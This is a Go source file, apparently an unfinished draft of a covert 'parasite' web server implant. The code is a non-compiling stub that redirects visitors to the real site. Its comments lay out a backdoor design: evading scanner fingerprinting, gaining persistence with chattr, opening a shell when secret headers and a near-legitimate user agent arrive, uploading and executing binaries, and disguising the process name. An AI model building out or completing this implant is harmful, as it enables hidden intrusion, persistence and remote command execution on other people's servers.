package main

import (
	"fmt"
	"net/http"
	"os"
)

type Page struct {
    Title string
    Body  []byte
}

type HostSite struct {
    Proto string
    Port int 
    Url string
}

func handler(w http.ResponseWriter, r *http.Request) {
    fmt.Fprintf(w, "Hi there, I love %s!", r.URL.Path[1:])
}

func redirectMain(w http.ResponseWriter, r *http.Request) {
	http.Redirect(w, r, "https://freshman.tech", http.StatusSeeOther)
}


func main() {

    // Oh when did we have Web Proxy?
    // Oh When did we get this new VHOST? 

    isParasiteProxy := false
    isParasiteVHOST := false

    // -r 'proto' provide either http or https 
    // -rp int provide a port numebr to redirect to 
    // -ru 'url' provide a url if main page redirects
    
    original := HostSite{}    

    // Need a way to when finger printed by scanners to state it is a proxy
    // Cover all possible 

    mux := http.NewServerMux()
    mux.Handle("/" http.RedirectHandler(original.Url, http.StatusSeeOther))    

    // Rate Limiter

    if isParasiteProxy {
    	// String builder for  ":8080"
    	http.ListenAndServe(":8080", mux)
    } else if isParasiteVHOST {
    } else {
	//error
    } 

}



// Hide in Plain WebApp - redirect to actual Webserver  

// Hide inandthrough  - symlink - rk controlled directory - backup 
// --custom-backup-loc  

// Persistence scripts to load as modules 
// default persistence - Linux - chattr etc

// --persistence  

// If Header X (Key) , Agent Y (Almost legitimate Agent string) , Header Z (Cmd:A |Shell:B )  Do -> Open Backdoor and respond with fingerprint for ssl-age 
// Header U: upload binary to server and execute - putty.exe, etc

// Open Backdoor 
// process .exe
// proc gnuintegrity
